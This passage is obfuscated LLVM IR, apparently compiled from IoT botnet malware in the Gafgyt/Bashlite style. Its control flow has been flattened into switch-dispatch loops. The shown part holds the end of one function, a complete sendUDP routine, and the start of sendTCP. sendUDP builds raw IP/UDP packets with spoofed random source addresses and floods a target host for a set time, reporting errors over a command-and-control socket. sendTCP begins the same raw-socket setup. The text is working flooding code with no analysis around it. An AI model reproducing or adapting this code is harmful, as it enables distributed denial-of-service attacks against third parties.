NewDefault:                                       ; preds = %loopEntry
  store i32 -2108438042, i32* %switchVar
  br label %loopEnd

; <label>:2021:                                   ; preds = %loopEntry
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:2022:                                   ; preds = %loopEntry
  %2023 = load i32, i32* %2, align 4
  %2024 = add nsw i32 %2023, 1
  store i32 %2024, i32* %2, align 4
  store i32 -710721843, i32* %switchVar
  br label %loopEnd

; <label>:2025:                                   ; preds = %loopEntry
  store i32 -1809714339, i32* %switchVar
  br label %loopEnd

; <label>:2026:                                   ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %2025, %2022, %2021, %NewDefault, %2020, %2005, %1995, %1975, %1966, %1960, %1952, %1947, %1932, %1923, %1918, %1903, %1894, %1893, %1878, %1868, %1867, %1866, %1865, %1864, %1863, %1862, %1861, %1849, %1843, %1838, %1818, %1809, %1789, %1772, %1752, %1746, %1741, %1721, %1712, %1692, %1675, %1655, %1649, %1644, %1624, %1615, %1595, %1578, %1558, %1552, %1547, %1527, %1518, %1498, %1481, %1461, %1455, %1450, %1430, %1421, %1401, %1384, %1364, %1358, %1353, %1333, %1324, %1304, %1287, %1267, %1261, %1256, %1236, %1227, %1207, %1190, %1170, %1164, %1159, %1139, %1130, %1110, %1093, %1073, %1067, %1059, %1054, %1039, %1030, %1015, %989, %988, %973, %963, %962, %950, %949, %948, %947, %946, %945, %944, %943, %928, %919, %904, %895, %880, %871, %856, %847, %832, %823, %808, %799, %784, %775, %760, %751, %745, %740, %735, %718, %698, %692, %687, %682, %665, %645, %639, %631, %626, %611, %602, %587, %561, %560, %545, %535, %534, %522, %512, %507, %502, %485, %465, %459, %454, %449, %432, %412, %406, %398, %397, %382, %372, %371, %356, %352, %351, %320, %305, %294, %262, %261, %252, %251, %245, %237, %236, %227, %216, %211, %188, %187, %162, %161, %156, %147, %136, %121, %101, %88, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %NodeBlock7, %LeafBlock9, %NodeBlock11, %NodeBlock13, %NodeBlock15, %NodeBlock17, %70, %65, %64, %63, %60, %57, %42, %37, %23, %21, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  store i32 %29, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -191365687, i32* %switchVar
  %.reg2mem10 = alloca i32
  %.reg2mem12 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %6
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -191365687, label %first
    i32 66354349, label %32
    i32 20793769, label %36
    i32 -2120621122, label %41
    i32 -1195561637, label %47
    i32 1164141949, label %48
    i32 1134446303, label %55
    i32 -926728908, label %60
    i32 -1928350382, label %63
    i32 460981514, label %71
    i32 -32221688, label %72
    i32 -1204736632, label %82
    i32 -694973668, label %93
    i32 -51142488, label %97
    i32 -981199957, label %101
    i32 -1144143277, label %106
    i32 -788317948, label %107
    i32 -599182183, label %108
    i32 -931513035, label %111
    i32 -1155291358, label %112
    i32 1809311989, label %117
    i32 -766944476, label %120
    i32 -737512206, label %126
    i32 -1030826969, label %129
    i32 693245358, label %130
    i32 1629442316, label %135
    i32 -1058023361, label %140
    i32 -72656339, label %144
    i32 678527408, label %145
    i32 2127915656, label %151
    i32 -1022416478, label %191
    i32 512386407, label %193
    i32 -1925268493, label %198
    i32 -1678309958, label %223
    i32 2100273527, label %224
    i32 1694803481, label %237
    i32 -568158945, label %239
    i32 -1547620436, label %244
    i32 278440998, label %271
    i32 -470767274, label %276
    i32 1846580315, label %277
    i32 -1805429772, label %278
    i32 513835407, label %281
    i32 1206138524, label %283
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %30 = icmp eq i32 %.reload, 0
  %31 = select i1 %30, i32 66354349, i32 20793769
  store i32 %31, i32* %switchVar
  br label %loopEnd

; <label>:32:                                     ; preds = %loopEntry
  %33 = call i32 @rand_cmwc()
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  store i32 -2120621122, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %8, align 4
  %38 = trunc i32 %37 to i16
  %39 = call zeroext i16 @htons(i16 zeroext %38) #13
  %40 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %39, i16* %40, align 2
  store i32 -2120621122, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %44 = call i32 @getHost(i8* %42, %struct.in_addr* %43)
  %45 = icmp ne i32 %44, 0
  %46 = select i1 %45, i32 -1195561637, i32 1164141949
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  store i32 1206138524, i32* %switchVar
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %50 = getelementptr inbounds [8 x i8], [8 x i8]* %49, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 8, i32 4, i1 false)
  %51 = load i32, i32* %12, align 4
  store i32 %51, i32* %14, align 4
  %52 = load i32, i32* %10, align 4
  %53 = icmp eq i32 %52, 32
  %54 = select i1 %53, i32 1134446303, i32 -1155291358
  store i32 %54, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = call i32 @socket(i32 2, i32 2, i32 17) #2
  store i32 %56, i32* %15, align 4
  %57 = load i32, i32* %15, align 4
  %58 = icmp ne i32 %57, 0
  %59 = select i1 %58, i32 -1928350382, i32 -926728908
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = load i32, i32* @mainCommSock, align 4
  %62 = call i32 (i32, i8*, ...) @sockprintf(i32 %61, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i32 0, i32 0))
  store i32 1206138524, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* %11, align 4
  %65 = add nsw i32 %64, 1
  %66 = sext i32 %65 to i64
  %67 = call noalias i8* @malloc(i64 %66) #2
  store i8* %67, i8** %16, align 8
  %68 = load i8*, i8** %16, align 8
  %69 = icmp eq i8* %68, null
  %70 = select i1 %69, i32 460981514, i32 -32221688
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  store i32 1206138524, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load i8*, i8** %16, align 8
  %74 = load i32, i32* %11, align 4
  %75 = add nsw i32 %74, 1
  %76 = sext i32 %75 to i64
  call void @llvm.memset.p0i8.i64(i8* %73, i8 0, i64 %76, i32 1, i1 false)
  %77 = load i8*, i8** %16, align 8
  %78 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %77, i32 %78)
  %79 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %80 = load i32, i32* %9, align 4
  %81 = add nsw i32 %79, %80
  store i32 %81, i32* %17, align 4
  store i32 0, i32* %18, align 4
  store i32 -1204736632, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %15, align 4
  %84 = load i8*, i8** %16, align 8
  %85 = load i32, i32* %11, align 4
  %86 = sext i32 %85 to i64
  %87 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %88 = call i64 @sendto(i32 %83, i8* %84, i64 %86, i32 0, %struct.sockaddr* %87, i32 16)
  %89 = load i32, i32* %18, align 4
  %90 = load i32, i32* %14, align 4
  %91 = icmp eq i32 %89, %90
  %92 = select i1 %91, i32 -694973668, i32 -599182183
  store i32 %92, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  %94 = load i32, i32* %8, align 4
  %95 = icmp eq i32 %94, 0
  %96 = select i1 %95, i32 -51142488, i32 -981199957
  store i32 %96, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  %98 = call i32 @rand_cmwc()
  %99 = trunc i32 %98 to i16
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %99, i16* %100, align 2
  store i32 -981199957, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  %102 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %103 = load i32, i32* %17, align 4
  %104 = icmp sgt i32 %102, %103
  %105 = select i1 %104, i32 -1144143277, i32 -788317948
  store i32 %105, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  store i32 -931513035, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  store i32 0, i32* %18, align 4
  store i32 -1204736632, i32* %switchVar
  br label %loopEnd

; <label>:108:                                    ; preds = %loopEntry
  %109 = load i32, i32* %18, align 4
  %110 = add i32 %109, 1
  store i32 %110, i32* %18, align 4
  store i32 -1204736632, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  store i32 1206138524, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %113, i32* %19, align 4
  %114 = load i32, i32* %19, align 4
  %115 = icmp ne i32 %114, 0
  %116 = select i1 %115, i32 -766944476, i32 1809311989
  store i32 %116, i32* %switchVar
  br label %loopEnd

; <label>:117:                                    ; preds = %loopEntry
  %118 = load i32, i32* @mainCommSock, align 4
  %119 = call i32 (i32, i8*, ...) @sockprintf(i32 %118, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i32 0, i32 0))
  store i32 1206138524, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  %121 = load i32, i32* %19, align 4
  %122 = bitcast i32* %20 to i8*
  %123 = call i32 @setsockopt(i32 %121, i32 0, i32 3, i8* %122, i32 4) #2
  %124 = icmp slt i32 %123, 0
  %125 = select i1 %124, i32 -737512206, i32 -1030826969
  store i32 %125, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i32, i32* @mainCommSock, align 4
  %128 = call i32 (i32, i8*, ...) @sockprintf(i32 %127, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.46, i32 0, i32 0))
  store i32 1206138524, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 50, i32* %21, align 4
  store i32 693245358, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i32, i32* %21, align 4
  %132 = add nsw i32 %131, -1
  store i32 %132, i32* %21, align 4
  %133 = icmp ne i32 %131, 0
  %134 = select i1 %133, i32 1629442316, i32 -1058023361
  store i32 %134, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %137 = call i32 @rand_cmwc()
  %138 = xor i32 %136, %137
  call void @srand(i32 %138) #2
  %139 = call i32 @rand() #2
  call void @init_rand(i32 %139)
  store i32 693245358, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i32, i32* %10, align 4
  %142 = icmp eq i32 %141, 0
  %143 = select i1 %142, i32 -72656339, i32 678527408
  store i32 %143, i32* %switchVar
  br label %loopEnd

; <label>:144:                                    ; preds = %loopEntry
  store i32 0, i32* %22, align 4
  store i32 2127915656, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  %146 = load i32, i32* %10, align 4
  %147 = sub nsw i32 32, %146
  %148 = shl i32 1, %147
  %149 = sub nsw i32 %148, 1
  %150 = xor i32 %149, -1
  store i32 %150, i32* %22, align 4
  store i32 2127915656, i32* %switchVar
  br label %loopEnd

; <label>:151:                                    ; preds = %loopEntry
  %152 = load i32, i32* %11, align 4
  %153 = sext i32 %152 to i64
  %154 = add i64 28, %153
  store i64 %154, i64* %.reg2mem2
  %155 = call i8* @llvm.stacksave()
  store i8* %155, i8** %23, align 8
  %.reload4 = load volatile i64, i64* %.reg2mem2
  %156 = alloca i8, i64 %.reload4, align 16
  store i8* %156, i8** %.reg2mem5
  %.reload9 = load volatile i8*, i8** %.reg2mem5
  %157 = bitcast i8* %.reload9 to %struct.iphdr*
  store %struct.iphdr* %157, %struct.iphdr** %24, align 8
  %158 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %159 = bitcast %struct.iphdr* %158 to i8*
  %160 = getelementptr i8, i8* %159, i64 20
  %161 = bitcast i8* %160 to %struct.udphdr*
  store %struct.udphdr* %161, %struct.udphdr** %25, align 8
  %162 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %163 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %164 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %163, i32 0, i32 0
  %165 = load i32, i32* %164, align 4
  %166 = load i32, i32* %22, align 4
  %167 = call i32 @getRandomIP(i32 %166)
  %168 = call i32 @htonl(i32 %167) #13
  %169 = load i32, i32* %11, align 4
  %170 = sext i32 %169 to i64
  %171 = add i64 8, %170
  %172 = trunc i64 %171 to i32
  call void @makeIPPacket(%struct.iphdr* %162, i32 %165, i32 %168, i8 zeroext 17, i32 %172)
  %173 = load i32, i32* %11, align 4
  %174 = sext i32 %173 to i64
  %175 = add i64 8, %174
  %176 = trunc i64 %175 to i16
  %177 = call zeroext i16 @htons(i16 zeroext %176) #13
  %178 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %179 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %178, i32 0, i32 0
  %180 = bitcast %union.anon.3* %179 to %struct.anon.4*
  %181 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %180, i32 0, i32 2
  store i16 %177, i16* %181, align 2
  %182 = call i32 @rand_cmwc()
  %183 = trunc i32 %182 to i16
  %184 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %185 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %184, i32 0, i32 0
  %186 = bitcast %union.anon.3* %185 to %struct.anon.4*
  %187 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %186, i32 0, i32 0
  store i16 %183, i16* %187, align 2
  %188 = load i32, i32* %8, align 4
  %189 = icmp eq i32 %188, 0
  %190 = select i1 %189, i32 -1022416478, i32 512386407
  store i32 %190, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %192 = call i32 @rand_cmwc()
  store i32 -1925268493, i32* %switchVar
  store i32 %192, i32* %.reg2mem10
  br label %loopEnd

; <label>:193:                                    ; preds = %loopEntry
  %194 = load i32, i32* %8, align 4
  %195 = trunc i32 %194 to i16
  %196 = call zeroext i16 @htons(i16 zeroext %195) #13
  %197 = zext i16 %196 to i32
  store i32 -1925268493, i32* %switchVar
  store i32 %197, i32* %.reg2mem10
  br label %loopEnd

; <label>:198:                                    ; preds = %loopEntry
  %.reload11 = load i32, i32* %.reg2mem10
  %199 = trunc i32 %.reload11 to i16
  %200 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %201 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %200, i32 0, i32 0
  %202 = bitcast %union.anon.3* %201 to %struct.anon.4*
  %203 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %202, i32 0, i32 1
  store i16 %199, i16* %203, align 2
  %204 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %205 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %204, i32 0, i32 0
  %206 = bitcast %union.anon.3* %205 to %struct.anon.4*
  %207 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %206, i32 0, i32 3
  store i16 0, i16* %207, align 2
  %208 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %209 = bitcast %struct.udphdr* %208 to i8*
  %210 = getelementptr inbounds i8, i8* %209, i64 8
  %211 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %210, i32 %211)
  %.reload8 = load volatile i8*, i8** %.reg2mem5
  %212 = bitcast i8* %.reload8 to i16*
  %213 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 2
  %215 = load i16, i16* %214, align 2
  %216 = zext i16 %215 to i32
  %217 = call zeroext i16 @csum(i16* %212, i32 %216)
  %218 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 7
  store i16 %217, i16* %219, align 2
  %220 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %221 = load i32, i32* %9, align 4
  %222 = add nsw i32 %220, %221
  store i32 %222, i32* %26, align 4
  store i32 0, i32* %27, align 4
  store i32 -1678309958, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  store i32 2100273527, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = load i32, i32* %19, align 4
  %226 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %.reload3 = load volatile i64, i64* %.reg2mem2
  %.reload7 = load volatile i8*, i8** %.reg2mem5
  %227 = call i64 @sendto(i32 %225, i8* %.reload7, i64 %.reload3, i32 0, %struct.sockaddr* %226, i32 16)
  %228 = call i32 @rand_cmwc()
  %229 = trunc i32 %228 to i16
  %230 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %231 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %230, i32 0, i32 0
  %232 = bitcast %union.anon.3* %231 to %struct.anon.4*
  %233 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %232, i32 0, i32 0
  store i16 %229, i16* %233, align 2
  %234 = load i32, i32* %8, align 4
  %235 = icmp eq i32 %234, 0
  %236 = select i1 %235, i32 1694803481, i32 -568158945
  store i32 %236, i32* %switchVar
  br label %loopEnd

; <label>:237:                                    ; preds = %loopEntry
  %238 = call i32 @rand_cmwc()
  store i32 -1547620436, i32* %switchVar
  store i32 %238, i32* %.reg2mem12
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  %240 = load i32, i32* %8, align 4
  %241 = trunc i32 %240 to i16
  %242 = call zeroext i16 @htons(i16 zeroext %241) #13
  %243 = zext i16 %242 to i32
  store i32 -1547620436, i32* %switchVar
  store i32 %243, i32* %.reg2mem12
  br label %loopEnd

; <label>:244:                                    ; preds = %loopEntry
  %.reload13 = load i32, i32* %.reg2mem12
  %245 = trunc i32 %.reload13 to i16
  %246 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %247 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %246, i32 0, i32 0
  %248 = bitcast %union.anon.3* %247 to %struct.anon.4*
  %249 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %248, i32 0, i32 1
  store i16 %245, i16* %249, align 2
  %250 = call i32 @rand_cmwc()
  %251 = trunc i32 %250 to i16
  %252 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 3
  store i16 %251, i16* %253, align 4
  %254 = load i32, i32* %22, align 4
  %255 = call i32 @getRandomIP(i32 %254)
  %256 = call i32 @htonl(i32 %255) #13
  %257 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 8
  store i32 %256, i32* %258, align 4
  %.reload6 = load volatile i8*, i8** %.reg2mem5
  %259 = bitcast i8* %.reload6 to i16*
  %260 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 2
  %262 = load i16, i16* %261, align 2
  %263 = zext i16 %262 to i32
  %264 = call zeroext i16 @csum(i16* %259, i32 %263)
  %265 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %266 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %265, i32 0, i32 7
  store i16 %264, i16* %266, align 2
  %267 = load i32, i32* %27, align 4
  %268 = load i32, i32* %14, align 4
  %269 = icmp eq i32 %267, %268
  %270 = select i1 %269, i32 278440998, i32 -1805429772
  store i32 %270, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %273 = load i32, i32* %26, align 4
  %274 = icmp sgt i32 %272, %273
  %275 = select i1 %274, i32 -470767274, i32 1846580315
  store i32 %275, i32* %switchVar
  br label %loopEnd

; <label>:276:                                    ; preds = %loopEntry
  store i32 513835407, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  store i32 0, i32* %27, align 4
  store i32 -1678309958, i32* %switchVar
  br label %loopEnd

; <label>:278:                                    ; preds = %loopEntry
  %279 = load i32, i32* %27, align 4
  %280 = add i32 %279, 1
  store i32 %280, i32* %27, align 4
  store i32 -1678309958, i32* %switchVar
  br label %loopEnd

; <label>:281:                                    ; preds = %loopEntry
  %282 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %282)
  store i32 1206138524, i32* %switchVar
  br label %loopEnd

; <label>:283:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %281, %278, %277, %276, %271, %244, %239, %237, %224, %223, %198, %193, %191, %151, %145, %144, %140, %135, %130, %129, %126, %120, %117, %112, %111, %108, %107, %106, %101, %97, %93, %82, %72, %71, %63, %60, %55, %48, %47, %41, %36, %32, %first, %switchDefault
  br label %loopEntry
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #4

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %.reg2mem5 = alloca i8*
  %.reg2mem2 = alloca i64
  %.reg2mem = alloca i32
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  store i32 %28, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -929955364, i32* %switchVar
  %.reg2mem10 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %7
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -929955364, label %first
    i32 308775835, label %31
    i32 -1792628223, label %35
    i32 1431389649, label %40
    i32 1640492871, label %46
    i32 -1816288741, label %47
    i32 -703532305, label %54
    i32 -505270324, label %57
    i32 -1954855393, label %63
    i32 -1961501963, label %66
    i32 -1120238639, label %70
    i32 1893519573, label %71
    i32 305598452, label %77
    i32 1936026158, label %125
    i32 -1485885048, label %161
    i32 1398896984, label %164
    i32 -2019003245, label %168
    i32 1521941114, label %173
    i32 -1405552895, label %181
    i32 991270835, label %186
    i32 -386838182, label %194
    i32 1608187017, label %199
    i32 109759497, label %207
    i32 1716262238, label %212
    i32 -1363887496, label %220
    i32 829719333, label %225
    i32 -1069479533, label %233
    i32 146390346, label %237
    i32 314523020, label %238
    i32 1491448069, label %239
    i32 377938105, label %240
    i32 1814379447, label %241
    i32 205286252, label %243
    i32 968458579, label %244
    i32 382767352, label %262
    i32 1156728489, label %264
    i32 672061161, label %269
    i32 827576249, label %293
    i32 -1979518868, label %294
    i32 -213909989, label %341
    i32 1405519756, label %346
    i32 -786888608, label %347
    i32 -1088108803, label %348
    i32 1663864006, label %351
    i32 1697259631, label %353
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %29 = icmp eq i32 %.reload, 0
  %30 = select i1 %29, i32 308775835, i32 -1792628223
  store i32 %30, i32* %switchVar
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  store i32 1431389649, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32, i32* %9, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  store i32 1431389649, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  %41 = load i8*, i8** %8, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  %45 = select i1 %44, i32 1640492871, i32 -1816288741
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  store i32 1697259631, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %49 = getelementptr inbounds [8 x i8], [8 x i8]* %48, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %49, i8 0, i64 8, i32 4, i1 false)
  %50 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %50, i32* %17, align 4
  %51 = load i32, i32* %17, align 4
  %52 = icmp ne i32 %51, 0
  %53 = select i1 %52, i32 -505270324, i32 -703532305
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* @mainCommSock, align 4
  %56 = call i32 (i32, i8*, ...) @sockprintf(i32 %55, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.45, i32 0, i32 0))
  store i32 1697259631, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  store i32 1, i32* %18, align 4
  %58 = load i32, i32* %17, align 4
  %59 = bitcast i32* %18 to i8*
  %60 = call i32 @setsockopt(i32 %58, i32 0, i32 3, i8* %59, i32 4) #2
  %61 = icmp slt i32 %60, 0
  %62 = select i1 %61, i32 -1954855393, i32 -1961501963
  store i32 %62, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.46, i32 0, i32 0))
  store i32 1697259631, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
